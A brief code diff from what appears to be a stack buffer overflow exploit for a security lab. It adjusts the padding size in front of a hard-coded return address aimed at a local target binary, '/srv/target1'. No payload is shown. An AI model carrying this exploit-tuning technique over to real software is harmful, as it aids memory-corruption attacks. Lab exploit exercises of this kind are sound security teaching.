@@ -7,7 +7,7 @@
 
 #define TARGET "/srv/target1"
 
-#define PADDING_SIZE 20
+#define PADDING_SIZE 12
 #define RETURN_ADDRESS 0xffffd719
 
 int main(void) {
